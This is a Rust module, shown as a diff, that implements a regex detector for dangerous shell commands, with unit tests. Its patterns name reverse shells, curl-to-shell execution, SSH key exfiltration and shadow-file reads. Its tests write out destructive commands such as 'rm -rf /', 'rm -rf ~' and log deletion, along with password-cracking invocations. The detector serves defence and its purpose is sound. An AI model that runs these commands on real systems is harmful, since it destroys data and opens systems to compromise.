@@ -1,0 +1,588 @@
+use regex::Regex;
+use std::collections::HashMap;
+use std::sync::LazyLock;
+
+/// Security threat patterns for command injection detection
+/// These patterns detect dangerous shell commands and injection attempts
+#[derive(Debug, Clone)]
+pub struct ThreatPattern {
+    pub name: &'static str,
+    pub pattern: &'static str,
+    pub description: &'static str,
+    pub risk_level: RiskLevel,
+    pub category: ThreatCategory,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
+pub enum RiskLevel {
+    Low,      // Minor security issue
+    Medium,   // Moderate security concern
+    High,     // Significant security risk
+    Critical, // Immediate system compromise risk
+}
+
+#[derive(Debug, Clone, PartialEq)]
+pub enum ThreatCategory {
+    FileSystemDestruction,
+    RemoteCodeExecution,
+    DataExfiltration,
+    SystemModification,
+    NetworkAccess,
+    ProcessManipulation,
+    PrivilegeEscalation,
+    CommandInjection,
+}
+
+impl RiskLevel {
+    pub fn confidence_score(&self) -> f32 {
+        match self {
+            RiskLevel::Critical => 0.95,
+            RiskLevel::High => 0.75,
+            RiskLevel::Medium => 0.60,
+            RiskLevel::Low => 0.45,
+        }
+    }
+}
+
+/// Comprehensive list of dangerous command patterns
+pub const THREAT_PATTERNS: &[ThreatPattern] = &[
+    ThreatPattern {
+        name: "rm_rf_root_bare",
+        pattern: r"rm\s+(-[rRfF]+\s+)*(-[rRfF]+|--recursive|--force|--no-preserve-root)(\s+(-[rRfF]+|--recursive|--force|--no-preserve-root))*\s+['\x22]?/(\./)*(\*)?['\x22]?(\s|[;&|]|$)",
+        description: "Recursive deletion of root filesystem",
+        risk_level: RiskLevel::Critical,
+        category: ThreatCategory::FileSystemDestruction,
+    },
+    ThreatPattern {
+        name: "rm_rf_home_or_root",
+        pattern: r"rm\s+((--[a-zA-Z][a-zA-Z\-]*|--|-[a-zA-Z]+)\s+)*(-[a-zA-Z]*[rR][a-zA-Z]*|--recursive|--dir|-d)(\s+(--[a-zA-Z][a-zA-Z\-]*|--|-[a-zA-Z]+))*\s+['\x22]?(~|\$HOME|\$\{HOME\}|/home|/root)/?(\*)?['\x22]?(\s|[;&|]|$)",
+        description: "Recursive deletion of home or root directory",
+        risk_level: RiskLevel::Critical,
+        category: ThreatCategory::FileSystemDestruction,
+    },
+    ThreatPattern {
+        name: "dd_destruction",
+        pattern: r"dd\s+.*if=/dev/(zero|random|urandom).*of=/dev/[sh]d[a-z]",
+        description: "Disk destruction using dd command",
+        risk_level: RiskLevel::Critical,
+        category: ThreatCategory::FileSystemDestruction,
+    },
+    ThreatPattern {
+        name: "format_drive",
+        pattern: r"(format|mkfs\.[a-z]+)\s+[/\\]dev[/\\][sh]d[a-z]",
+        description: "Formatting system drives",
+        risk_level: RiskLevel::Critical,
+        category: ThreatCategory::FileSystemDestruction,
+    },
+    // Remote code execution patterns
+    ThreatPattern {
+        name: "curl_bash_execution",
+        pattern: r#"(curl|wget)\s+.*\|\s*['"]?(?:[a-zA-Z]:)?(?:[./\\]|[a-zA-Z0-9._-]+[/\\])*(bash|sh|zsh|fish|csh|tcsh)(?:\.exe)?(?:['"]|\s|[;&|<>]|$)"#,
+        description: "Remote script execution via curl/wget piped to shell",
+        risk_level: RiskLevel::Critical,
+        category: ThreatCategory::RemoteCodeExecution,
+    },
+    ThreatPattern {
+        name: "bash_process_substitution",
+        pattern: r"bash\s*<\s*\(\s*(curl|wget)",
+        description: "Bash process substitution with remote content",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::RemoteCodeExecution,
+    },
+    ThreatPattern {
+        name: "python_remote_exec",
+        pattern: r"python[23]?\s+-c\s+.*urllib|requests.*exec",
+        description: "Python remote code execution",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::RemoteCodeExecution,
+    },
+    ThreatPattern {
+        name: "powershell_download_exec",
+        pattern: r"powershell.*DownloadString.*Invoke-Expression",
+        description: "PowerShell remote script execution",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::RemoteCodeExecution,
+    },
+    // Data exfiltration patterns
+    ThreatPattern {
+        name: "ssh_key_exfiltration",
+        pattern: r"(curl|wget).*-d.*\.ssh/(id_rsa|id_ed25519|id_ecdsa)",
+        description: "SSH key exfiltration",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::DataExfiltration,
+    },
+    ThreatPattern {
+        name: "password_file_access",
+        pattern: r"(cat|grep|awk|sed).*(/etc/shadow|\.password)",
+        description: "Password/shadow file access",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::DataExfiltration,
+    },
+    ThreatPattern {
+        name: "history_exfiltration",
+        pattern: r"(curl|wget).*-d.*\.(bash_history|zsh_history|history)",
+        description: "Command history exfiltration",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::DataExfiltration,
+    },
+    // System modification patterns
+    ThreatPattern {
+        name: "crontab_modification",
+        pattern: r"(crontab\s+-e|echo.*>.*crontab|.*>\s*/var/spool/cron)",
+        description: "Crontab modification for persistence",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::SystemModification,
+    },
+    ThreatPattern {
+        name: "systemd_service_creation",
+        pattern: r"systemctl.*enable|.*\.service.*>/etc/systemd",
+        description: "Systemd service creation",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::SystemModification,
+    },
+    ThreatPattern {
+        name: "hosts_file_modification",
+        pattern: r"echo.*>(>?)\s*(/etc/hosts|hosts\.txt)|echo.*\|\s*(sudo\s+)?tee\s+(-a\s+)?/etc/hosts",
+        description: "Hosts file modification",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::SystemModification,
+    },
+    // Network access patterns
+    ThreatPattern {
+        name: "netcat_listener",
+        pattern: r"nc\s+(-l|-p)\s+\d+",
+        description: "Netcat listener creation",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::NetworkAccess,
+    },
+    ThreatPattern {
+        name: "reverse_shell",
+        pattern: r"(nc|netcat|bash|sh).*-e\s*(bash|sh|/bin/bash|/bin/sh)",
+        description: "Reverse shell creation",
+        risk_level: RiskLevel::Critical,
+        category: ThreatCategory::NetworkAccess,
+    },
+    ThreatPattern {
+        name: "ssh_tunnel",
+        pattern: r"ssh\s+.*-[LRD]\s+\d+:",
+        description: "SSH tunnel creation",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::NetworkAccess,
+    },
+    // Process manipulation patterns
+    ThreatPattern {
+        name: "kill_security_process",
+        pattern: r"kill(all)?\s+.*\b(antivirus|firewall|defender|security|monitor)\b",
+        description: "Killing security processes",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::ProcessManipulation,
+    },
+    ThreatPattern {
+        name: "process_injection",
+        pattern: r"gdb\s+.*attach|ptrace.*PTRACE_POKETEXT",
+        description: "Process injection techniques",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::ProcessManipulation,
+    },
+    // Privilege escalation patterns
+    ThreatPattern {
+        name: "sudo_without_password",
+        pattern: r"echo.*NOPASSWD.*>.*sudoers",
+        description: "Sudo privilege escalation",
+        risk_level: RiskLevel::Critical,
+        category: ThreatCategory::PrivilegeEscalation,
+    },
+    ThreatPattern {
+        name: "suid_binary_creation",
+        pattern: r"chmod\s+[47][0-7][0-7][0-7]|chmod\s+\+s",
+        description: "SUID binary creation",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::PrivilegeEscalation,
+    },
+    ThreatPattern {
+        name: "encoded_commands",
+        pattern: r"(base64|hex|url).*decode.*\|\s*(bash|sh)",
+        description: "Encoded command execution",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::CommandInjection,
+    },
+    // Obfuscation and evasion patterns
+    ThreatPattern {
+        name: "base64_encoded_shell",
+        pattern: r"(echo|printf)\s+[A-Za-z0-9+/=]{20,}\s*\|\s*base64\s+-d\s*\|\s*(bash|sh|zsh)",
+        description: "Base64 encoded shell commands",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::CommandInjection,
+    },
+    ThreatPattern {
+        name: "hex_encoded_commands",
+        pattern: r"(echo|printf)\s+[0-9a-fA-F\\x]{20,}\s*\|\s*(xxd|od).*\|\s*(bash|sh)",
+        description: "Hex encoded command execution",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::CommandInjection,
+    },
+    ThreatPattern {
+        name: "eval_with_variables",
+        pattern: r"eval\s+\$[A-Za-z_][A-Za-z0-9_]*|\beval\s+.*\$\{",
+        description: "Eval with variable substitution",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::CommandInjection,
+    },
+    ThreatPattern {
+        name: "indirect_command_execution",
+        pattern: r"\$\([^)]*\$\([^)]*\)[^)]*\)|`[^`]*`[^`]*`",
+        description: "Nested command substitution",
+        risk_level: RiskLevel::Low,
+        category: ThreatCategory::CommandInjection,
+    },
+    ThreatPattern {
+        name: "unicode_obfuscation",
+        pattern: r"(\\u[0-9a-fA-F]{4}|\\U[0-9a-fA-F]{8}){3,}",
+        description: "Unicode character obfuscation (3+ consecutive escapes)",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::CommandInjection,
+    },
+    ThreatPattern {
+        name: "docker_privileged_exec",
+        pattern: r"docker\s+(run|exec).*--privileged",
+        description: "Docker privileged container execution",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::PrivilegeEscalation,
+    },
+    ThreatPattern {
+        name: "container_escape",
+        pattern: r"(chroot|unshare|nsenter).*--mount|--pid|--net",
+        description: "Container escape techniques",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::PrivilegeEscalation,
+    },
+    ThreatPattern {
+        name: "kernel_module_manipulation",
+        pattern: r"(insmod|rmmod|modprobe).*\.ko",
+        description: "Kernel module manipulation",
+        risk_level: RiskLevel::Critical,
+        category: ThreatCategory::SystemModification,
+    },
+    ThreatPattern {
+        name: "memory_dump",
+        pattern: r"(gcore|gdb.*dump|/proc/[0-9]+/mem)",
+        description: "Memory dumping techniques",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::DataExfiltration,
+    },
+    ThreatPattern {
+        name: "log_manipulation",
+        pattern: r"(truncate.*log|rm\s+((--[a-zA-Z][a-zA-Z\-]*|--|-[a-zA-Z]+)\s+)*/var/log(/|\s|[;&|]|$)|echo\s*>\s*/var/log)",
+        description: "Log file manipulation or deletion",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::SystemModification,
+    },
+    ThreatPattern {
+        name: "file_timestamp_manipulation",
+        pattern: r"touch\s+-[amt]\s+|utimes|futimes",
+        description: "File timestamp manipulation",
+        risk_level: RiskLevel::Low,
+        category: ThreatCategory::SystemModification,
+    },
+    ThreatPattern {
+        name: "steganography_tools",
+        pattern: r"\b(steghide|outguess|jphide|steganos)\b",
+        description: "Steganography tools usage",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::DataExfiltration,
+    },
+    ThreatPattern {
+        name: "network_scanning",
+        pattern: r"\b(nmap|masscan|zmap|unicornscan)\b.*-[sS]",
+        description: "Network scanning tools",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::NetworkAccess,
+    },
+    ThreatPattern {
+        name: "password_cracking_tools",
+        pattern: r"\bjohn\s+--[a-z]|\b(hashcat|hydra|medusa|brutespray)\b",
+        description: "Password cracking tools",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::PrivilegeEscalation,
+    },
+];
+
+static COMPILED_PATTERNS: LazyLock<HashMap<&'static str, Regex>> = LazyLock::new(|| {
+    let mut patterns = HashMap::new();
+    for threat in THREAT_PATTERNS {
+        if let Ok(regex) = Regex::new(&format!("(?i){}", threat.pattern)) {
+            patterns.insert(threat.name, regex);
+        }
+    }
+    patterns
+});
+
+/// Pattern matcher for detecting security threats
+pub struct PatternMatcher {
+    patterns: &'static HashMap<&'static str, Regex>,
+}
+
+impl PatternMatcher {
+    pub fn new() -> Self {
+        Self {
+            patterns: &COMPILED_PATTERNS,
+        }
+    }
+
+    pub fn scan_for_patterns(&self, text: &str) -> Vec<PatternMatch> {
+        let mut matches = Vec::new();
+
+        for threat in THREAT_PATTERNS {
+            if let Some(regex) = self.patterns.get(threat.name) {
+                if regex.is_match(text) {
+                    // Find all matches to get position information
+                    for regex_match in regex.find_iter(text) {
+                        matches.push(PatternMatch {
+                            threat: threat.clone(),
+                            matched_text: regex_match.as_str().to_string(),
+                            start_pos: regex_match.start(),
+                            end_pos: regex_match.end(),
+                        });
+                    }
+                }
+            }
+        }
+
+        // Sort by risk level (highest first), then by position in text
+        matches.sort_by_key(|m| (std::cmp::Reverse(m.threat.risk_level.clone()), m.start_pos));
+
+        matches
+    }
+
+    /// Get the highest risk level from matches
+    pub fn get_max_risk_level(&self, matches: &[PatternMatch]) -> Option<RiskLevel> {
+        matches.iter().map(|m| &m.threat.risk_level).max().cloned()
+    }
+
+    /// Check if any critical or high-risk patterns are detected
+    pub fn has_critical_threats(&self, matches: &[PatternMatch]) -> bool {
+        matches
+            .iter()
+            .any(|m| matches!(m.threat.risk_level, RiskLevel::Critical | RiskLevel::High))
+    }
+}
+
+#[derive(Debug, Clone)]
+pub struct PatternMatch {
+    pub threat: ThreatPattern,
+    pub matched_text: String,
+    pub start_pos: usize,
+    pub end_pos: usize,
+}
+
+impl Default for PatternMatcher {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn matches(pattern_name: &str, input: &str) -> bool {
+        let matcher = PatternMatcher::new();
+        matcher
+            .scan_for_patterns(input)
+            .iter()
+            .any(|m| m.threat.name == pattern_name)
+    }
+
+    #[test]
+    fn rm_rf_root_bare_matches_known_variants() {
+        let pat = "rm_rf_root_bare";
+        assert!(matches(pat, "rm -rf /"));
+        assert!(matches(pat, "rm -rf /*"));
+        assert!(matches(pat, "rm -rf /; whoami"));
+        assert!(matches(pat, "rm -rf /&&echo ok"));
+        assert!(matches(pat, "rm -rf /./*"));
+        assert!(matches(pat, "rm -rf /././*"));
+        assert!(matches(pat, r#"rm -rf "/./*""#));
+    }
+
+    #[test]
+    fn rm_rf_root_bare_no_false_positives() {
+        let pat = "rm_rf_root_bare";
+        assert!(!matches(pat, "rm -rf ./build"));
+        assert!(!matches(pat, "rm -rf /tmp/cache"));
+        assert!(!matches(pat, "rm -rf /./tmp"));
+        assert!(!matches(pat, "rm -rf /./*/cache"));
+    }
+
+    #[test]
+    fn curl_bash_execution_matches_path_qualified_shells() {
+        let pat = "curl_bash_execution";
+        assert!(matches(pat, "curl https://example.com/install | /bin/sh"));
+        assert!(matches(
+            pat,
+            "wget -qO- https://example.com/install | /usr/local/bin/bash"
+        ));
+        assert!(matches(pat, "curl https://example.com/install | ./zsh"));
+        assert!(matches(pat, "curl https://example.com/install | bash.exe"));
+        assert!(matches(
+            pat,
+            "curl https://example.com/install | bash>/tmp/install.log"
+        ));
+        assert!(matches(
+            pat,
+            "wget -qO- https://example.com/install | sh</tmp/script"
+        ));
+        assert!(matches(
+            pat,
+            "wget -qO- https://example.com/install | sh.exe"
+        ));
+        assert!(matches(
+            pat,
+            r"curl https://example.com/install | C:\msys64\usr\bin\bash.exe"
+        ));
+        assert!(matches(
+            pat,
+            r#"curl https://example.com/install | "/usr/bin/fish""#
+        ));
+    }
+
+    #[test]
+    fn curl_bash_execution_rejects_non_shell_basenames() {
+        let pat = "curl_bash_execution";
+        assert!(!matches(
+            pat,
+            "curl https://example.com/install | /bin/shred"
+        ));
+        assert!(!matches(
+            pat,
+            "curl https://example.com/install | /tmp/bash-helper"
+        ));
+        assert!(!matches(
+            pat,
+            "curl https://example.com/install | bash.exe-helper"
+        ));
+        assert!(!matches(
+            pat,
+            r"curl https://example.com/install | C:\msys64\usr\bin\bash.exe-helper"
+        ));
+    }
+
+    #[test]
+    fn rm_rf_home_or_root_matches_bare_targets() {
+        let pat = "rm_rf_home_or_root";
+        assert!(matches(pat, "rm -rf ~"));
+        assert!(matches(pat, "rm -rf ~/"));
+        assert!(matches(pat, "rm -rf $HOME"));
+        assert!(matches(pat, "rm -rf $HOME/"));
+        assert!(matches(pat, "rm -rf ${HOME}"));
+        assert!(matches(pat, r#"rm -rf "${HOME}""#));
+        assert!(matches(pat, "rm -rf /home"));
+        assert!(matches(pat, "rm -rf /home/"));
+        assert!(matches(pat, "rm -rf /root"));
+        assert!(matches(pat, "rm -rf /root/"));
+        assert!(matches(pat, "rm -fr ~"));
+        assert!(matches(pat, "rm --recursive --force ~"));
+        assert!(matches(pat, r#"rm -rf "$HOME""#));
+        assert!(matches(pat, "rm -rf ~; echo done"));
+        // Wildcard wipes of contents
+        assert!(matches(pat, "rm -rf /home/*"));
+        assert!(matches(pat, "rm -rf /root/*"));
+        assert!(matches(pat, "rm -rf ~/*"));
+        assert!(matches(pat, "rm -rf ${HOME}/*"));
+        assert!(matches(pat, r#"rm -rf "/home/*""#));
+        // Extra flags and option separator
+        assert!(matches(pat, "rm -rfv ~"));
+        assert!(matches(pat, "rm -rf -- ~"));
+        assert!(matches(pat, "rm --recursive --force -- /home/*"));
+    }
+
+    #[test]
+    fn rm_rf_home_or_root_no_false_positives_on_subdirs() {
+        let pat = "rm_rf_home_or_root";
+        assert!(!matches(pat, "rm -rf ~/Documents/my-gh-repo"));
+        assert!(!matches(pat, "rm -rf ~/.cache"));
+        assert!(!matches(pat, "rm -rf $HOME/build"));
+        assert!(!matches(pat, "rm -rf ${HOME}/build"));
+        assert!(!matches(pat, "rm -rf ${HOMEDIR}"));
+        assert!(!matches(pat, "rm -rf /home/user"));
+        assert!(!matches(pat, "rm -rf /home/user/project"));
+        assert!(!matches(pat, "rm -rf /root/tmp"));
+        assert!(!matches(pat, "rm -rf ./home"));
+        assert!(!matches(pat, "rm -rf $HOMEDIR"));
+        // Wildcards inside subdirs should not match
+        assert!(!matches(pat, "rm -rf /home/user/*"));
+        assert!(!matches(pat, "rm -rf ~/Documents/*"));
+        // Flags that cannot recursively remove directories should not fire
+        assert!(!matches(pat, "rm -i /root"));
+        assert!(!matches(pat, "rm -f ~"));
+        assert!(!matches(pat, "rm --force ~"));
+        assert!(!matches(pat, "rm --help ~"));
+        assert!(!matches(pat, "rm -v ~"));
+        assert!(!matches(pat, "rm -- ~"));
+        assert!(!matches(pat, "rm ~"));
+    }
+
+    #[test]
+    fn password_cracking_tools_matches_real_invocations() {
+        let pat = "password_cracking_tools";
+        assert!(matches(
+            pat,
+            "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
+        ));
+        assert!(matches(pat, "/usr/sbin/john --format=raw-md5 hashes.txt"));
+        assert!(matches(pat, "john --rules --incremental hash.txt"));
+        assert!(matches(pat, "hashcat -m 1000 -a 0 hash.txt wordlist.txt"));
+        assert!(matches(pat, "hydra -l admin -P passwords.txt ssh://target"));
+        assert!(matches(
+            pat,
+            "medusa -h target -u admin -P wordlist.txt -M ssh"
+        ));
+    }
+
+    #[test]
+    fn password_cracking_tools_no_false_positives_on_name_john() {
+        let pat = "password_cracking_tools";
+        assert!(!matches(pat, "# DS_PLATFORM -> John's integration type"));
+        assert!(!matches(pat, "git log --author=John"));
+        assert!(!matches(pat, "echo \"Hello John\""));
+        assert!(!matches(pat, "grep -r \"john.doe@company.com\" ."));
+        assert!(!matches(pat, "mkdir -p /home/john"));
+        assert!(!matches(pat, "cat /tmp/john_report.csv"));
+    }
+
+    #[test]
+    fn log_manipulation_no_dev_null_false_positives() {
+        let pat = "log_manipulation";
+        // Standard stderr suppression should NOT match
+        assert!(!matches(pat, "ls 2>/dev/null"));
+        assert!(!matches(pat, "rm -f /tmp/file 2>/dev/null"));
+        assert!(!matches(pat, "command > /dev/null 2>&1"));
+        // Actual log tampering should still match
+        assert!(matches(pat, "truncate -s 0 /var/log/auth.log"));
+        assert!(matches(pat, "echo > /var/log/syslog"));
+        assert!(matches(pat, "rm -f /var/log/auth.log"));
+        assert!(matches(pat, "rm -rf /var/log/syslog"));
+        assert!(matches(pat, "rm -fr /var/log/auth.log"));
+        assert!(matches(pat, "rm -rf /var/log"));
+        assert!(matches(pat, "rm --recursive --force /var/log/auth.log"));
+        assert!(matches(pat, "rm --recursive /var/log"));
+        assert!(matches(pat, "rm -rf -- /var/log/auth.log"));
+        assert!(matches(pat, "rm -rfv /var/log/auth.log"));
+        // Similar-looking paths outside /var/log should NOT match
+        assert!(!matches(pat, "rm -rf /var/log-backup"));
+        assert!(!matches(pat, "rm -rf /var/logs"));
+    }
+
+    #[test]
+    fn unicode_obfuscation_requires_consecutive_escapes() {
+        let pat = "unicode_obfuscation";
+        // Isolated escapes in legitimate code/strings should NOT match
+        assert!(!matches(pat, r"\u0041"));
+        assert!(!matches(pat, r"echo \u00e9 \u00e8"));
+        // Runs of 3+ consecutive escapes (obfuscation) should match
+        assert!(matches(pat, r"\u0041\u0042\u0043"));
+        assert!(matches(pat, r"\U00000041\U00000042\U00000043"));
+        // Mixed 4-digit and 8-digit forms should also match
+        assert!(matches(pat, r"\u0065\U00000076\u0061"));
+    }
+}
